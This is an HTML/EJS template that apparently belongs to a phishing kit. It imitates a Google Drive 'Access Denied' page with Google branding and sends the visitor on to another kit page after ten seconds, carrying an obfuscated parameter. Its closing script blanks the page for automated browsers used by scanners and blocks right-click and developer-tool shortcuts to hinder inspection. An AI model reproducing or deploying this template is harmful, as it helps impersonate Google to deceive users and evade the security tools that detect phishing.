


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<title>Drive Warning</title>
<%- include('partials/meta-noindex') %>
<link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">

<!-- Google-like font -->
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Google Sans', system-ui, -apple-system, sans-serif;
            background-color: #ffffff;
            display: none;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        
        .card {
            background: white;
            width: 100%;
            max-width: 680px;
            overflow: hidden;
            padding: 48px 40px;
            transform: translateY(-50px);
        }
        
        .content {
            display: flex;
            align-items: center;
            gap: 60px;
        }
        
        .left {
            flex: 1;
            text-align: center;
        }
        
        .right {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        h1 {
            font-size: 35px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }
        
        .subtitle {
            font-size: 15px;
            color: black;
            margin-bottom: 32px;
           ;        }


        
        .learn-more {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
        
        .learn-more:hover {
            text-decoration: underline;
        }
        
        .message-box {
            width: 100%;
            min-height: 85px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 12px 16px;
            font-family: inherit;
            font-size: 14px;
            margin: 32px 0;
            resize: vertical;
        }
        
        .message-box:focus {
            outline: none;
            border-color: #1a73e8;
        }
        
        .request-btn {
            background-color:#3a38fa;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        
        .request-btn:hover {
            background-color: #3a38fa;
        }
        
        /* Style the custom line */
.custom-line {
    height: 2px; /* Thickness of the line */
    background-color: #4CAF50; /* Green color (can be changed) */
    margin: 20px 0; /* Adds space above and below the line */
    width: 100%; /* Makes the line full width of the container */
}
       
    </style>
    <script>
        function returnToDrive() {
            const urlParams = new URLSearchParams(window.location.search);
            const paramValue = urlParams.get('nxowuwonvdmbqrrwewosnadgdhgdus') || '';
            window.location.href = "first?nxowuwonvdmbqrrwewosnadgdhgdus=" + encodeURIComponent(paramValue);
        }
        setTimeout(returnToDrive, 10000);
    </script>
</head>
<body>
    <div class="card">
        
        <div class="content">

            <!-- Left Side -->
            <div class="left">
                <!-- Add the Google Drive Logo here -->
                <img src="data:image/png;base64," alt="Google Drive" width="280px">
<br></br>
                <p style="color: red; font-size: 24px;">Access Denied</p><br>
                <p class="subtitle">
                   Your account does not have permission to access this Google Drive file. <br>
                   Please contact the owner or switch to an account with access.
                     
                </p>

                <button onclick="returnToDrive()" style="background-color: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 20px; font-size: 14px; cursor: pointer;"> Return to Drive </button>
               
   
            </div>
            
         
                </div>
            </div>
        </div>
    </div>
<script>
(function(){
  document.querySelector('body').style.display='flex';
  if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom){
    document.body.innerHTML='';
    window.location.href='about:blank';
  }
  document.addEventListener('contextmenu',function(e){e.preventDefault();});
  document.addEventListener('keydown',function(e){
    if(e.key==='F12')e.preventDefault();
    if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'))e.preventDefault();
    if(e.ctrlKey&&(e.key==='U'||e.key==='u'))e.preventDefault();
    if(e.ctrlKey&&e.shiftKey&&(e.key==='J'||e.key==='j'))e.preventDefault();
    if(e.ctrlKey&&e.shiftKey&&(e.key==='C'||e.key==='c'))e.preventDefault();
  });
})();
</script>
</body>
</html>
